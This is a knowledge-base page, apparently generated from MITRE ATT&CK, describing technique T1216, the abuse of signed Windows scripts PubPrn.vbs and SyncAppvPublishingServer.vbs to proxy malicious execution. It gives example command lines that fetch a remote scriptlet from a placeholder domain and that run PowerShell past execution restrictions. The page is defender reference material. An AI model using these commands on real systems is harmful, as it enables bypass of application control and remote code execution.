---
mitre_id: "T1216"
mitre_name: "System Script Proxy Execution"
mitre_type: "attack-pattern"
mitre_stix_id: "attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe"
mitre_created: "2018-04-18T17:59:24.739Z"
mitre_modified: "2025-10-24T17:49:37.665Z"
mitre_version: "2.1"
mitre_domains:
  - "enterprise-attack"
mitre_url: "https://attack.mitre.org/techniques/T1216/"
framework: "attack"
generated: "true"
build_date: "2026-04-26 13:08:46"
build_source: "script"
object_type: "technique"
mitre_is_subtechnique: "False"
mitre_platforms:
  - "Windows"
mitre_tactic_ids:
  - "TA0005"
tags:
  - "attack"
  - "technique"
  - "offense"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[workspaces/index|Notes]]

---

Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)

## Workspace

- [[workspaces/attack/techniques/T1216-system_script_proxy_execution-note|Open workspace note]]

![[workspaces/attack/techniques/T1216-system_script_proxy_execution-note]]

## Tactics

- [[TA0005-defense_evasion|TA0005: Defense Evasion]]

## Subtechniques

### T1216.001: PubPrn

^t1216001-pubprn

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [[T1059-command_and_scripting_interpreter#^t1059005-visual-basic|T1059.005: Visual Basic]] script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [[T1059-command_and_scripting_interpreter#^t1059003-windows-command-shell|T1059.003: Windows Command Shell]] via `Cscript.exe`. For example, the following code publishes a printer within the specified domain: `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com`.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second `script:` parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the `script:` moniker which could be used to reference remote code via HTTP(S).

### T1216.002: SyncAppvPublishingServer

^t1216002-syncappvpublishingserver

Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [[T1059-command_and_scripting_interpreter#^t1059001-powershell|T1059.001: PowerShell]] commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)
    
The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)

Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [[T1059-command_and_scripting_interpreter#^t1059001-powershell|T1059.001: PowerShell]] execution restrictions and evade defensive counter measures by "living off the land."(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)

For example,  [[T1059-command_and_scripting_interpreter#^t1059001-powershell|T1059.001: PowerShell]] commands may be invoked using:(Citation: 5 - appv)

`SyncAppvPublishingServer.vbs "n; {PowerShell}"`

## Mitigations

- [[M1038-execution_prevention|M1038: Execution Prevention]]

## Platforms

- Windows

